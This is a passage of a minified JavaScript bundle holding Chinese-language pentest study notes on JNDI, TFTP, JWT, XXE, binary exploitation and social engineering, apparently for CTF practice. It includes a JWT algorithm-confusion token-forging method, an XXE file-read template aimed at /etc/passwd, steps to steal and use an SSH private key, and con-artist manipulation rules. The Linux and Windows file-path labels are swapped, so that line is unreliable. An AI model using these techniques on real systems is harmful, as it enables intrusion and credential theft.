                      JNDI \u5728j2ee\u7CFB\u7EDF\u4E2D\u7684\u89D2\u8272\u662F\u201C\u4EA4\u6362\u673A\u201D\uFF0C\u662FJ2EE\u7EC4\u4EF6\u5728\u6267\u884C\u65F6\u95F4\u63A5\u5730\u67E5\u627E\u5176\u5B83\u7EC4\u4EF6\u3001\u8D44\u6E90\u6216\u670D\u52A1\u7684\u901A\u7528\u673A\u5236\u3002
                      JNDI \u662F\u901A\u8FC7\u8D44\u6E90\u7684\u540D\u5B57\u6765\u67E5\u627E\u7684\uFF0C\u8D44\u6E90\u7684\u540D\u5B57\u5728\u6574\u4E2Aj2ee\u5E94\u7528\u4E2D(j2ee\u5BB9\u5668\u4E2D)\u662F\u552F\u4E00\u7684\u3002



          \u91CD\u8981\u6982\u5FF5\uFF1A
              \u3010SPI\u3011




          `))},{name:"\u3010LDAP\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          LDAP
          389
              Lightweight Directory Access Protocol

              \u4E00\u79CD\u5F00\u653E\u7684\u3001\u4F9B\u5E94\u5546\u4E2D\u7ACB\u7684\u3001\u884C\u4E1A\u6807\u51C6\u5E94\u7528\u534F\u8BAE\uFF0C\u7528\u4E8E\u901A\u8FC7 Internet \u6216\u7F51\u7EDC\u8BBF\u95EE\u548C\u7EF4\u62A4\u5206\u5E03\u5F0F\u76EE\u5F55\u4FE1\u606F\u670D\u52A1\u3002


          `))},{name:" \u548C   \u57FA\u672C\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`





          `))},ou]},Iu=Wu,jn=ou,Su=f("yEy/"),An=k.e.singleATag_blank,gn={name:"\u3010\u793E\u4F1A\u5DE5\u7A0B\u5B66\u3011_\u3010\u5FC3\u7406\u5B66\u3011_\u4EBA\u7684\u56E0\u7D20_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u5173\u4E8E\u5BC6\u7801
              1\xB7 \u4EBA\u4EEC\u5E38\u5E38\u4F1A\u4F7F\u7528\u3010\u540C\u6837\u7684\u5BC6\u7801\u3011\u3002
              2. \u4EBA\u4EEC\u7ECF\u5E38\u3010\u590D\u7528\u5BC6\u7801\u3011\u7684\u5927\u90E8\u5206\uFF0C\u4EC5\u5C06\u3010\u5E74\u4EFD2018\u3011\u7B49\u7684\u5B57\u7B26\u6539\u53D8\u3002
                      \u624B\u52A8\u4FEE\u6539 \u4E3A\uFF1A  2019\u30012020\u30012021\u30012022

          `))},{name:"\u5E38\u89C1\u9632\u5FA1\u624B\u6BB5 \uFF08\u6211\u4EEC\u653B\u53EF\u4EE5 \u53CD\u5176\u9053\u800C\u884C\u4E4B\uFF09",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
          \u4E2A\u4EBA\u5B89\u5168\u6E05\u5355\uFF1A
              \u30102022\u5E74\uFF0C\u4FDD\u62A4\u6570\u5B57\u5B89\u5168\u548C\u9690\u79C1\u7684\uFF0C300 \u591A\u4E2A\u63D0\u793A\u7684\u7CBE\u9009\u6E05\u5355\u3011
                  \u5730\u5740\uFF1A
                      https://github.com/Lissy93/personal-security-checklist
                  \u4ECB\u7ECD\uFF1A
                      \u5728\u73B0\u4EE3\u7F51\u7EDC\u65F6\u4EE3\u4FDD\u62A4\u6570\u5B57\u5B89\u5168\u548C\u9690\u79C1\u7684 300 \u591A\u4E2A\u63D0\u793A\u7684\u7CBE\u9009\u6E05\u5355\u3002\u4ECE\u8EAB\u4EFD\u9A8C\u8BC1\u3001\u6D4F\u89C8\u3001\u793E\u4EA4\u5A92\u4F53\u548C\u7535\u5B50\u90AE\u4EF6\u5230\u624B\u673A\u3001\u5B89\u5168\u6D88\u606F\u4F20\u9012\u548C\u667A\u80FD\u5BB6\u5C45\uFF0C\u5E94\u6709\u5C3D\u6709\u3002
          `))},{name:"\u5386\u53F2\u4E66\u7C4D",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u300A\u4E8C\u5341\u4E16\u7EAA\u6700\u5927\u7684\u9A97\u5B50\u300B

              \u62C9\u65AF\u8482\u683C\u5341\u8BEB

                  \u4E00\u3001\u505A\u4E2A\u6709\u8010\u5FC3\u7684\u503E\u542C\u8005
                  \u4E8C\u3001\u6C38\u8FDC\u4E0D\u8981\u88AB\u4EBA\u770B\u8D77\u6765\u65E0\u804A
                  \u4E09\u3001\u4E0D\u8981\u5148\u900F\u9732\u4EFB\u4F55\u653F\u6CBB\u89C2\u70B9  \u7B49\u5BF9\u65B9\u5148\u8BF4  \u7136\u540E\u8D5E\u540C
                  \u56DB\u3001\u7B49\u5F85\u5BF9\u65B9\u8868\u660E\u5B97\u6559\u89C2\u70B9  \u7136\u540E\u8D5E\u540C
                  \u4E94\u3001\u505A\u6697\u793A\u6027\u8C08\u8BDD  \u4E0D\u8981\u6025\u7740\u8DDF\u8FDB  \u9664\u975E\u5BF9\u65B9\u6709\u5F3A\u70C8\u7684\u5174\u8DA3
                  \u516D\u3001\u6C38\u8FDC\u4E0D\u8981\u8C08\u8BBA\u75BE\u75C5  \u538B\u6291\u7684\u6C14\u6C1B\u65E0\u6CD5\u542F\u53D1\u8D2A\u5A6A
                  \u4E03\u3001\u6C38\u8FDC\u4E0D\u8981\u7AA5\u63A2\u5BF9\u65B9\u7684\u4E2A\u4EBA\u60C5\u51B5  \u4ED6\u4EEC\u6700\u7EC8\u90FD\u4F1A\u544A\u8BC9\u4F60
                  \u516B\u3001\u6C38\u8FDC\u4E0D\u8981\u5439\u5618  \u8BA9\u81EA\u5DF1\u7684\u91CD\u8981\u6027\u6084\u6084\u7684\u663E\u800C\u6613\u89C1
                  \u4E5D\u3001\u6C38\u8FDC\u4E0D\u8981\u51CC\u4E71  \u65E0\u8BBA\u5916\u8868\u8FD8\u662F\u5FC3\u6001
                  \u5341\u3001\u505A\u751F\u610F\u671F\u95F4  \u5343\u4E07\u4E0D\u80FD\u559D\u9189

          \u300A\u7279\u52A1\u5DE5\u4F5C\u4E4B\u7406\u8BBA\u4E0E\u5B9E\u9645\u300B
                  PDF\u5730\u5740\uFF1Ahttps://taiwanebook.ncl.edu.tw/zh-tw/book/NCL-9900010638/reader



          `))}]},rn=gn,Pn=k.e.singleATag_blank,an={name:"\u3010TFTP\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4F7F\u7528",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

  69
  TFTP


      \u4ECB\u7ECD\uFF1A

          Trivial File Transfer Protocol
              \u666E\u901A\u7410\u788E \u7684 \u6587\u4EF6 \u4F20\u8F93 \u534F\u8BAE

          \u7B80\u5355\u7684\u534F\u8BAE
              \u5B83\u63D0\u4F9B \u3010\u65E0\u9700\u7528\u6237\u8BA4\u8BC1\u3011\u7684\u57FA\u672C\u6587\u4EF6\u4F20\u8F93\u529F\u80FD\u3002

          TFTP \u9002\u7528\u4E8E\u4E0D\u9700\u8981\u3010FTP\u3011\u63D0\u4F9B\u7684\u590D\u6742\u4EA4\u4E92\uFF0C\u7684\u573A\u666F

          TFTP \u4F7F\u7528\u7528\u6237\u6570\u636E\u62A5\u534F\u8BAE (UDP) \u8FDB\u884C\u901A\u4FE1
              \u8FD9\u88AB\u5B9A\u4E49\u4E3A\uFF0C\u5728 IP \u4E4B\u4E0A\u5DE5\u4F5C\u7684\u8F7B\u91CF\u7EA7\u6570\u636E\u4F20\u8F93\u534F\u8BAE\u3002

              \u3010UDP\u3011\u4E5F\u6709\u50CF\u3010TCP\u3011\u4E00\u6837\u7684\u3010\u7AEF\u53E3\u3011\u5B9A\u4E49\u3002

          tftpd-hpa

      \u5E38\u89C1\u914D\u7F6E\uFF1A

          \u8D44\u6599\uFF1Ahttps://help.ubuntu.com/community/TFTP#Installation

          \u5B58\u50A8\u8DEF\u5F84\uFF1A
              \u4E00\u822C\uFF0C\u662F\u3010TFTP\u7528\u6237\u3011\u7684\u3010Home\u76EE\u5F55\u3011

                  \u4E3E\u4F8B\uFF0C\u6BD4\u5982\u3010/var/lib/tftpboot\u3011

                  \u53EF\u4EE5\u5C1D\u8BD5\uFF0C\u5047\u8BBE\u3010\u8FD9\u4E2A\u76EE\u5F55\u3011\u5C31\u662F\u3010\u4E0A\u4F20\u4E0B\u8F7D\u3011\u7684\u3010\u5B58\u50A8\u8DEF\u5F84\u3011\u3002

          \u914D\u7F6E\u6587\u4EF6\uFF1A
              \u9ED8\u8BA4\u4E3A\u3010/etc/default/tftpd-hpa\u3011\u3002

      \u547D\u4EE4

          \u767B\u5F55

              \u9ED8\u8BA4\u60C5\u51B5\u4E0B\uFF0CTFTP \u65E0\u9700\u8EAB\u4EFD\u9A8C\u8BC1\u5373\u53EF\u5DE5\u4F5C\u3002

              tftp  <IP\u5730\u5740>

          \u6267\u884C

              \u5E2E\u52A9
                  \u3010?\u3011\uFF0C\u67E5\u770B\u5185\u90E8\u5E2E\u52A9

              \u8FDE\u63A5
                  \u3010connect\u3011

                  \u3010status\u3011
                      \u67E5\u770B\u5F53\u524D\u72B6\u6001


              \u5217\u8868
                  \u6CA1\u6709\u3010\u5217\u8868\u3011\u6307\u4EE4\u3002\u9760\u76F2\u6253\u3002

              \u4F20\u8F93
                  \u3010get\u3011
                  \u3010put\u3011

              \u4F20\u8F93\u6A21\u5F0F
                  \u3010mode\u3011
                      \u53EF\u4EE5\u662F ascii \u6216 binary \u3002\u9ED8\u8BA4\u4E3A\u3010ascii\u3011

                  \u3010ascii\u3011\uFF0C\u7B80\u5199

                  \u3010binary\u3011\uFF0C\u7B80\u5199

              \u9000\u51FA
                  \u3010quit\u3011

          `))}]},Bn=an,Dn=f("FOD2"),Qu=k.e.singleATag_blank,wn={name:"\u3010JWT\u3011_\u624B\u518C",steps:[{name:"\u3010JWT\u3011\u3001\u3010jsonwebtoken\u3011\u3001",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`



          \u3010jsonwebtoken\u3011\u5B58\u5728\u7684\u6F0F\u6D1E

              \u8D44\u6599\uFF1Ahttps://snyk.io/test/npm/jsonwebtoken/4.0.0#npm:jsonwebtoken:20150331

              \u8FC7\u7A0B\uFF1A
                  1. \u671F\u5F85\u201CRSA\u201D\uFF08\u516C\u94A5-\u79C1\u94A5\u65B9\u6848\uFF09\uFF0C\u4F46\u63A5\u6536\u201CHSA256\u201D\uFF08\u5BF9\u79F0\u5BC6\u94A5\u65B9\u6848\uFF09\uFF1B\u653B\u51FB\u8005\u53EF\u4EE5\u4F7F\u7528\u66F4\u65B0\u7684\u201Calg\u201D\u8F7B\u677E\u4F2A\u9020\u4EE4\u724C
                  2. \u5C06\u91CD\u65B0\u4F7F\u7528\u7684\u516C\u94A5\u4F5C\u4E3A\u9A8C\u8BC1\u5BC6\u94A5\u76F2\u76EE\u4F20\u9012\u7ED9\u670D\u52A1\u5668\u7AEF\u9A8C\u8BC1\u65B9\u6CD5\uFF0C\u6DF7\u6DC6\u5DF2\u77E5\u516C\u94A5\u4F5C\u4E3A HS256 \u7684\u9A8C\u8BC1\u5BC6\u94A5

          \u9776\u673A\u8BE6\u89E3\uFF1A
              HTB - Under Construction\uFF1A
                  https://www.wulfgar.pro/hackthebox-under-construction/
                      \u56E0\u4E3A\u6709\u4E00\u5B9A\u7406\u89E3\u96BE\u5EA6\uFF0C\u6240\u4EE5\u53EF\u4EE5\u591A\u8BFB\u51E0\u904D

          \u68C0\u67E5JWT
              https://jwt.io/

              \u539F\u7406\uFF1A
                  \u53C2\u8003\u8D44\u6599\uFF1Ahttps://www.cnblogs.com/snowie/p/14689894.html
                      \u5728\u3010JWTHelper.js\u3011\u6587\u4EF6\u4E2D\uFF0C\u3010decode\u3011\u73AF\u8282\uFF0C\u652F\u6301\u4E86\u3010\u4E24\u79CD\u7B97\u6CD5\u3011\u2014\u2014RS256 + HS256

                  \u3010RS256\u3011\u548C\u3010HS256\u3011\uFF0C\u4E24\u79CD\u7B97\u6CD5\u7684\u88AB\u6DF7\u6DC6
                  \u524D\u8005\uFF0C\u662F\u3010\u975E\u5BF9\u79F0\u7B97\u6CD5\u3011\uFF0C\u6709\u4E24\u79CD\u5BC6\u94A5\u4E00\u5BF9\uFF1B    \u540E\u8005\uFF0C\u662F\u3010\u5BF9\u79F0\u7B97\u6CD5\u3011\uFF0C\u6709\u4E00\u4E2A\u5BC6\u94A5

                  \u5C06\u3010RS256\u3011\u7684\u3010\u516C\u94A5\u3011\uFF0C\u4F5C\u4E3A\u3010HS256\u3011\u7684\u3010\u552F\u4E00\u5BC6\u94A5\u3011

          jwt_tool
              \u8D44\u6599\uFF1Ahttps://github.com/ticarpi/jwt_tool

          jwt_forge.py
              \u8D44\u6599\uFF1Ahttps://gist.github.com/wulfgarpro/3e87ae77a7107a3e3a2453eb38a3de20

          Python\u7684\u3010jwt\u3011\u6A21\u5757
              jwt.encode()
                  \u5982\u679C\u5BF9\u3010\u516C\u94A5\u7C7B\u578B\u3011\u6709\u9650\u5236\uFF0C\u4FEE\u6539\u3010\u6A21\u5757\u6E90\u4EE3\u7801\u3011\u653E\u5F00\u9650\u5236\u5373\u53EF

          Header\uFF0C\u5305\u542B\u3010\u57FA\u672C\u52A0\u5BC6\u7C7B\u578B\u3011\u7B49\u57FA\u672C\u4FE1\u606F

          Payload\uFF0C\u643A\u5E26\u7684\u3010\u81EA\u5B9A\u4E49JSON\u3011\u4FE1\u606F\u3002

          Signature\u7B7E\u540D\uFF0C\u6307\u3010Header + Payload + Private\u3011\uFF0C\u7528\u3010\u70B9\u53F7\u3011\u62FC\u63A5\u540E\uFF0C\u518D\u8D70\u4E00\u904D\u52A0\u5BC6


          \u9488\u5BF9\u573A\u666F\uFF1A
              \u5185\u7F6ESQL\u67E5\u8BE2\uFF0C\u5F15\u7528\u4E86\u3010Payload\u3011\u4E2D\u5185\u7F6E\u7684\u53C2\u6570\u3001\u53D8\u91CF\u3002
                  \u800C\u8FD9\u4E00\u70B9\uFF0C\u6070\u6070\u6709\u53EF\u80FD \u89E6\u53D1sql\u6CE8\u5165

              \u5BFC\u81F4\uFF1A
                  1. \u65E0\u6CD5\u901A\u8FC7\u7B80\u5355\u4F20\u53C2\u89E3\u51B3\u3002\uFF08\u4E0D\u63A5\u53D7\u5916\u90E8\u4F20\u53C2\uFF09
                  2. \u5982\u679C\u5728Session\u4E2D\u4F20\uFF0C\u9700\u8981\u3010\u79C1\u94A5\u4E8C\u6B21\u52A0\u5BC6\u3011\uFF0C\u624D\u80FD\u5F62\u6210Session\u4E32\u3002

              \u6B64\u65F6\uFF0C\u5C31\u9700\u8981\u3010jwt_tool\u3011\u7B49\u5DE5\u5177\uFF0C\u5B9E\u73B0\u3010\u4E8C\u6B21\u52A0\u5BC6\u3011\u6B3A\u9A97\u3002


          \u3010sqlmap\u3011\u7684\u3010tamper\u3011\u811A\u672C\uFF0C\u4F7F\u7528\uFF1A
              \u8D44\u6599\uFF1Ahttps://www.cnblogs.com/snowie/p/14689894.html



          `))}]},nj=wn,Tn=k.e.singleATag_blank,Vn={name:"\u3010XXE\u3011_\u3010XEE\u3011_\u624B\u518C",steps:[{name:"\u3010XXE\u3011\u3001\u3010XEE\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          \u4ECB\u7ECD\uFF1A
              \u5916\u90E8\u5B9E\u4F53\u653B\u51FB
              \u5BF9\u5916\u90E8\u5B9E\u4F53\u7684\u5F15\u7528\u7684 XML \u8F93\u5165\u7531\u5F31\u914D\u7F6E\u7684 XML \u89E3\u6790\u5668\u5904\u7406\u65F6\uFF0C\u5C31\u4F1A\u53D1\u751F\u8FD9\u79CD\u653B\u51FB\u3002

                  \u653B\u51FB\u53EF\u80FD\u5BFC\u81F4\u673A\u5BC6\u6570\u636E\u6CC4\u9732\u3001\u62D2\u7EDD\u670D\u52A1\u3001\u670D\u52A1\u5668\u7AEF\u8BF7\u6C42\u4F2A\u9020\u3001\u4ECE\u89E3\u6790\u5668\u6240\u5728\u673A\u5668\u7684\u89D2\u5EA6\u8FDB\u884C\u7AEF\u53E3\u626B\u63CF\u7B49\u7CFB\u7EDF\u5F71\u54CD\u3002

          \u8D44\u6599\uFF1A
              https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
              https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity


          Content-Type: text/xml

          \u5229\u7528\uFF1A
              Linux\uFF1A
                  \u3010C:\\windows\\system32\\drivers\\etc\\hosts\u3011
              Windows\uFF1A
                  \u3010file:///etc/passwd\u3011

              \u57FA\u672C\u64CD\u4F5C\uFF1A
                  <!--?xml version="1.0" ?-->
                  <!DOCTYPE  <\u8FD9\u662F\u5565\u5440>  [<!ENTITY  <\u81EA\u5B9A\u4E49\u53D8\u91CF\u540DvarA>  SYSTEM  file:///<\u5177\u4F53\u6587\u4EF6\u5730\u5740>  > ]>
                  <data> &<\u81EA\u5B9A\u4E49\u53D8\u91CF\u540DvarA>; </data>


                      \u4F3C\u4E4E\u3010file:///\u3011\uFF0C\u53EF\u8981\u53EF\u4E0D\u8981\uFF1F\uFF1F\uFF1F

                      \u3010\u5177\u4F53\u6587\u4EF6\u5730\u5740\u3011\uFF0C\u65E0\u8BBA Windows \u3001 Linux\uFF0C\u90FD\u8981\u3010\u6B63\u659C\u6760\u3011  \u4E0D\u80FD\u7528\u3010\u53CD\u659C\u6760\u3011\u3002

          \u8BFB\u53D6\u3010.ssh\u3011
              \u3010C:/users/daniel/.ssh/id_rsa\u3011

              \u8BFB\u53D6\u5230\u4E4B\u540E\uFF0C\u4FDD\u5B58\u4E3A\u672C\u5730\u6587\u4EF6\u3010id_rsa\u3011

              \u4E3A\u3010id_rsa\u3011\u6587\u4EF6\uFF0C\u8BBE\u7F6E\u6743\u9650
                  chmod  400  <\u6587\u4EF6\u540D>

              \u767B\u5F55
                  ssh  -i  <\u5BC6\u94A5\u6587\u4EF6>  <\u7528\u6237\u540D>@<IP\u5730\u5740>



          \u3010docx\u3011\u4E0E\u3010\u538B\u7F29\u5305\u3011\uFF0C\u76F8\u5173\u7684\u3010XXE\u3011
              https://xz.aliyun.com/t/11203


          `))}]},Fn=Vn,Hu=k.e.singleATag_blank,en={name:`____\u624B\u518C
\u3010exe\u3011\u3001\u3010\u53EF\u6267\u884C\u6587\u4EF6\u3011\u3001
\u3010pwn\u3011\u3001
\u3010\u9006\u5411\u3011\u3001\u3010\u9006\u5411\u5DE5\u7A0B\u3011\u3001\u3010REVERSE ENGINEERING\u3011\u3001
\u3010\u53CD\u7F16\u8BD1\u3011\u3001\u3010decompile\u3011\u3001
\u3010\u6C47\u7F16\u3011\u3001\u3010ASM\u3011\u3001\u3010assemble\u3011\u3001
\u3010\u4E8C\u8FDB\u5236\u3011\u3001\u3010binary\u3011\u3001
\u3010Windows\u3011\u3001\u3010Linux\u3011\u3001
  `,steps:[{name:"\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u5E38\u89C1\u6307\u4EE4\uFF1A

              \u68C0\u67E5\u4E8C\u8FDB\u5236\u3010\u6587\u4EF6\u7C7B\u578B\u3011
                  file      <\u4E8C\u8FDB\u5236\u6587\u4EF6>

              \u68C0\u67E5\u4E8C\u8FDB\u5236\u3010\u5185\u5B58\u4FDD\u62A4\u3011
                  checksec  <\u4E8C\u8FDB\u5236\u6587\u4EF6>


          ELF\u6587\u4EF6

              123


          NX
              Non-Executable
              \u610F\u601D\u662F\u5F53\u5E94\u7528\u7A0B\u5E8F\u8FD0\u884C\u5E76\u52A0\u8F7D\u5230\u5185\u5B58\u4E2D\u65F6\uFF0C\u4E0D\u5141\u8BB8\u8FD9\u4E9B\u6BB5\u65E2\u53EF\u5199\u53C8\u53EF\u6267\u884C


          RELRO
              \u662F Relocation Read-Only \u7684\u9996\u5B57\u6BCD\u7F29\u5199

              \u8FD9\u610F\u5473\u7740\u7528\u4E8E\u5141\u8BB8\u52A8\u6001\u94FE\u63A5\u5668\u52A0\u8F7D\u548C\u94FE\u63A5\u7B26\u53F7\u7684\u5168\u5C40\u504F\u79FB\u8868\uFF08GOT\uFF09\u88AB\u6807\u8BB0\u4E3A\u53EA\u8BFB\u3002

          PLT\u3001GOT
              \u5168\u5C40\u504F\u79FB\u8868 (GOT) \u7531.got\u548C.got.plt\u90E8\u5206\u7EC4\u6210\u3002
                  \u8BE5.got\u6BB5\u4FDD\u5B58 libc \u4E2D\u51FD\u6570\u7684\u5730\u5740\u3002
                  GOT \u4E2D\u7684\u5730\u5740\u5728\u7A0B\u5E8F\u8FD0\u884C\u65F6\u7531\u52A8\u6001\u94FE\u63A5\u5668\u52A8\u6001\u586B\u5145\u3002
                  \u3010.got.plt\u3011\u6301\u6709.got\u5BF9\u6BCF\u4E2A\u7B26\u53F7\u7684\u5F15\u7528\u3002

              \u8FC7\u7A0B\u94FE\u63A5\u8868 (PLT) \u4EC5\u5305\u542B\u4E00\u4E2A\u90E8\u5206\uFF0C.plt. \u5BF9\u4E8E\u6211\u4EEC\u7A0B\u5E8F\u4E2D\u5F15\u7528\u7684\u5916\u90E8\u5E93\u4E2D\u7684\u6BCF\u4E2A\u51FD\u6570\uFF0C\u6211\u4EEC\u90FD\u6709\u4E00\u4E2A\u6761\u76EE\uFF0C.plt\u5176\u4E2D\u5B9E\u9645\u4E0A\u662F\u6307\u5411\u8BE5.got.plt\u51FD\u6570\u7684\u5730\u5740\u7684\u8DF3\u8F6C\u3002

          ASLR
              \u901A\u8FC7\u4FE1\u606F\u6CC4\u9732\u51FB\u8D25 ASLR


          ROP
              \u9762\u5411\u8FD4\u56DE\u7684\u7F16\u7A0B

              \u8FD9\u610F\u5473\u7740\u6211\u4EEC\u5C06\u4F7F\u7528\u5185\u5B58\u4E2D\u5DF2\u7ECF\u5B58\u5728\u7684\u51FD\u6570\u548C\u5C0F\u5DE5\u5177\uFF08\u6307\u4EE4\uFF09\u7684\u5730\u5740\u6EA2\u51FA\u8FD4\u56DE\u5730\u5740\uFF0C\u5E76\u4ECE\u4E00\u4E2A\u8DF3\u8F6C\u5230\u53E6\u4E00\u4E2A\u4EE5\u5229\u7528\u8BE5\u6F0F\u6D1E\u3002

              libc
                  \u4F7F\u7528libc \u4E2D system\u51FD\u6570 \u7684\u5730\u5740

                  \u4E3A\u4E86\u7ED5\u8FC7\u968F\u673A\u5316\uFF0C\u6211\u4EEC\u9700\u8981\u6CC4\u6F0F\u51FD\u6570\u7684\u5730\u5740\uFF08\u5728\u6211\u4EEC\u7684\u4F8B\u5B50puts\u4E2D\uFF09.got\uFF0C
                  \u7136\u540E\u4F7F\u7528\u5DEE\u5F02\u8BA1\u7B97\u548C\u7684\u5730\u5740system\uFF08/bin/sh\u5C3D\u7BA1 libc \u7684\u57FA\u5730\u5740\u662F\u968F\u673A\u7684\uFF0C\u4F46\u5176\u4E2D\u7B26\u53F7\u7684\u4F4D\u7F6E\u548C\u504F\u79FB\u91CF\u662F\u76F8\u540C\u7684\uFF09\u3002


          `))},{name:"\u3010Immunity Debugger\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u6587\u4EF6\u2014\u2014\u6253\u5F00

          \u641C\u7D22\u5B57\u7B26\u4E32
              \u8FD0\u884C\u6309\u94AE\u3001F9\u8C03\u8BD5\u3001\u8C03\u8BD5\u2014\u2014\u8FD0\u884C
              \u53F3\u4FA7\u2014\u2014\u5355\u51FB\u2014\u2014\u641C\u7D22
                  \u627E\u5230\u4E4B\u540E\uFF0CFollow in Disassembler
              \u591A\u591A\u8BBE\u7F6E\u3010\u65AD\u70B9\u3011
                  CALL\u64CD\u4F5C\uFF0C\u8BBE\u7F6E\u65AD\u70B9

          \u5728Call\u4E0A\uFF0C\u70B9\u51FBFollow\uFF0C\u53EF\u4EE5\u67E5\u770B\u51FD\u6570

          \u5E38\u7528\u6982\u5FF5
              EAX \u5BC4\u5B58\u5668
              CMP \u8FD0\u7B97\u7B26
              EDX \u5BC4\u5B58\u5668
              JE  \u8FD0\u7B97\u7B26

          `))},{name:"\u3010GDB\u3011\u3001\u3010GDB-peda\u3011\u3001\u3010GEF\u3011\u3001",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          GDB

              \u4ECB\u7ECD\uFF1A
                  \u5168\u79F0\uFF1AGNU Debugger

                  \u8FDC\u7A0B\u8C03\u8BD5\u4F7F\u7528

              \u300Ainfo function\u300B
                  flag()
                  vuln()
                  main()

                  gets()

              GDB-peda
                  pattern create <\u6570\u91CF>

                  EBP
                  EIP
                  starting offset
                      pattern offset

              Cutter
                  123

              fgets()



          GEF
              \u7C7B\u4F3C\u4E8E\u300AGDB\u300B


          `))},{name:"\u3010PEDA\u3011\uFF0C\u662F\u3010GDB\u3011\u7684\u63D2\u4EF6",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          PEDA
              \uFF08\u4E00\u4E2A\u4E0D\u9519\u7684 gdb \u63D2\u4EF6\uFF09

              \u63D0\u4F9B\u4E86\u4E00\u79CD\u901A\u8FC7\u5B57\u7B26\u4E32\u67E5\u627E\u5C0F\u5DE5\u5177\u7684\u597D\u65B9\u6CD5\u3002


          \u3010python\u3011\u4E2D\u7684\u3010PEDA\u3011

              Python Exploit Development Assistance
                  \u8D44\u6599\uFF1Ahttps://github.com/longld/peda



          `))},{name:"\u3010Pwn\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          pwn
              pwn\u4E8C\u8FDB\u5236\u6587\u4EF6
              pwn \u8FDC\u7A0B Web \u670D\u52A1

          `))},{name:"\u3010Pwn\u3011\u7684\u3010\u7B2C\u4E09\u65B9\u6A21\u5757\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          python
              \u300Apwn\u300B\u6A21\u5757
              \u300Apwntools\u300B\u6A21\u5757

          `))},{name:"\u3010UaF\u3011\u3001\u3010Use-after-Free\u3011\u3001\u3010Use after Free\u3011\u3001\u3010UseAfterFree\u3011    \uFF08\u8BE5\u8BCD\u6761\uFF0C\u53EF\u80FD\u7EE7\u7EED\u4F18\u5316\uFF09",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u4ECB\u7ECD\uFF1A
              \u6682\u65E0\u7EE7\u7EED\u4ECB\u7ECD\u3002

          `))},{name:"\u3010IDA\u3011\u5DE5\u5177\u3001\u3010CodeBrowser\u3011\u5DE5\u5177\u3001",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u57FA\u672C\u4ECB\u7ECD\uFF1A
              \u5C0F\u9ED1\u6559\u7684\u4F7F\u7528\u65B9\u5F0F\uFF1A
                  \u3010IDA\u3011\u7528\u6765\u770B\u4EE3\u7801\uFF1B\u3010CodeBrowser\u3011\u4E5F\u7528\u6765\u770B\u4EE3\u7801\u3002
                      \u6709\u4E9B\u5730\u65B9\uFF0C\u3010IDA\u3011\u7684\u53CD\u7F16\u8BD1\u4F1A\u6709\u95EE\u9898\uFF1B\u6709\u65F6\u5019\u3010CodeBrowser\u3011\u7684\u53CD\u7F16\u8BD1\u4F1A\u51FA\u95EE\u9898\u3002
                          \u5BF9\u7167\u7740\u770B\u3002
